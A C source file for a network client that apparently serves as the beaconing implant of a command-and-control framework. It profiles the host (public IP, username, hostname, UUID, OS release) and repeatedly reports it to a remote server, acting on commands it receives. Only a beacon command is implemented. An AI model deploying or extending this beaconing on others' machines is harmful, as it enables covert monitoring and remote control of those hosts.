/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include "../crypt.h"
#include "../net.h"
#include "../defs.h"

bool net_client(char *host, int port){
  /*
    :TODO: stub network client
    :returns: boolean
  */
  if (port < NET_PORT_MIN || port > NET_PORT_MAX){
    fprintf(stderr, "[x] server port is invalid\n");
    return false;
  }
  
  int sock_fd;
  char response[NET_MAX_RESPONSE_SIZE];
  struct sockaddr_in server;

  memset(response, 0, sizeof(response));

  memset(&server, 0, sizeof(server));
  server.sin_family      = AF_INET;
  server.sin_addr.s_addr = inet_addr(host);
  server.sin_port        = htons(port);

  net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_client_beacon_t));
  net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));

  sys_info_t sysinfo;

  sys_public_ip(sysinfo.ip);
  sys_username(sysinfo.username, SYS_USERNAME_SIZE);
  sys_arch(sysinfo.arch, SYS_ARCH_SIZE);
  sys_get_uuid(sysinfo.uuid);
  sys_hostname(sysinfo.hostname, SYS_HOSTNAME_SIZE);
  sys_release(sysinfo.release, SYS_RELEASE_SIZE);
  sysinfo.cpu_usage = sys_load_average();
  
  while(true){
    sock_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_fd < 0){
      fprintf(stderr, "[x] failed to create socket\n");
      return false;
    }

    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0){
      fprintf(stderr, "[-] failed to connect to server retrying in %ds\n", NET_CLIENT_SLEEP);
      close(sock_fd);
      sleep(NET_CLIENT_SLEEP);
      continue;
    } else{
      printf("[+] connected to %s:%d\n",
             inet_ntoa(server.sin_addr),
             ntohs(server.sin_port));
    }

    while(true){
      p_net_client_beacon->xor_key = crypt_random_xor_key();
      p_net_client_beacon->sysinfo = sysinfo;
      p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
      p_net_client_beacon->sysinfo.cpu_usage = sys_load_average();
      if (send(sock_fd, p_net_client_beacon, sizeof(net_client_beacon_t), 0) < 0){
        fprintf(stderr,
                "[-] failed to send data to %s:%d\n",
                inet_ntoa(server.sin_addr),
                ntohs(server.sin_port));
        break;
      }
      if (recv(sock_fd, p_net_server_beacon, sizeof(net_server_beacon_t), 0) <= 0){
        fprintf(stderr,
                "[-] failed to receive data from %s:%d\n",
                inet_ntoa(server.sin_addr),
                ntohs(server.sin_port));
        break;
      } else{
        if (p_net_server_beacon->status == true){
          switch(p_net_server_beacon->command){
          case NET_SERVER_CMD_BEACON:
            printf("[+] %s:%d OK\n",
                   inet_ntoa(server.sin_addr),
                   ntohs(server.sin_port));
            break;
          default:
            printf("[-] response data corrupt or command not supported\n");
            break;
          }
        } else{
          fprintf(stderr, "[-] beacon status failed\n");
        }
      }
      sleep(NET_CLIENT_SLEEP);
    }
    close(sock_fd);
  }
  return true;
}
